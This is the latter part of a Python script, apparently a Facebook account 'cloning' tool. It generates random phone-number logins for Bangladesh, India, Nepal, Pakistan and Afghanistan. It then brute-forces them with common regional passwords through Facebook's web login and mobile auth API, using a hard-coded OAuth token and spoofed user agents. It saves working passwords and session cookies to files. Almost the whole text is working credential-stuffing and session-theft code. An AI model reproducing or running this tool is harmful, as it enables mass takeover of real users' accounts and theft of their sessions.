    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} COOKIES SHOW Y{SK}|{SK}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xdxx} TOTAL UID {xdxx}{G} '+tl);print(f'{xdxx} SIM CODE  {xdxx}{G} '+code);print(f'{xxdx} FIRST ON{xxdx}|{xxdx}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM INDIA ❳-----------------------#
def ___India___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} +91639 {G}•{W} +92728 {G}•{W} +91737 {G}•{W} +94737");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200']
            elif pasxd in ['2','02']:pwx = [love,ids[:8],'57273200','59039200']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM NEPAL ❳-----------------------#
def ___Nepal___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 9815 {G}•{W} 9814 {G}•{W} 9782 {G}•{W} 9823");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif pasxd in ['2','02']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM PAKISTAN ❳-----------------------#
def ___Pakistan___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 0306 {G}•{W} 0335 {G}•{W} 0315 {G}•{W} 0345");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            elif pasxd in ['2','02']:pwx = [love,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM AFGHANISTAN ❳-----------------------#
def ___Afghanistan___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} +9340 {G}•{W} +9360 {G}•{W} +9330 {G}•{W} +9350");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            elif pasxd in ['2','02']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM METHOD BD HOST ❳-----------------------#
def ___HOST___(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush(),
    sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(cps)} ");sys.stdout.flush(),
    sys.stdout.flush()
    session=requests.Session()
    __ua__ = "Mozilla/5.0 (Linux; Android 13; RMX3750 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.136 Mobile Safari/537.36"
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': ___sex___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r{xd}{G} SHUVO-OK '+cid+' | '+pas+'\033[1;92m')
                        print(f'\r{xd}{G} SHUVO-CP '+cid+' | '+pas+'\033[1;30m')
                        print(f'\r{xd} COOKIES '+coki+'\x1b[38;5;223m');linex()
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'\n')
                        open('/sdcard/SHUVO-BD-RANDOM-CP.txt','a').write(cid+'|'+pas+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r{xd}{G} SHUVO-OK '+cid+' | '+pas+'\033[1;92m')
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                print(f'\r\r{xd}{O} SHUVO-CP {cid} | {pas}')
                open('/sdcard/SHUVO-BD-RANDOM-CP.txt', 'a').write(cid + '|' + pas + '\n')
                cps.append(cid)
                break 
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#-----------------------❲ RANDOM METHOD API ❳-----------------------#
def ___API___(ids,pwv,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{xd} SHUVO-XD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': generate_random_user00_agent(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r{xd}{G} SHUVO-OK '+ids+' | '+pas+'\033[1;92m')
                print(f'\r{xd} COOKIES '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/SHUVO-RANDOM-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#-----------------------❲ END ❳-----------------------#
___SHUVO___()
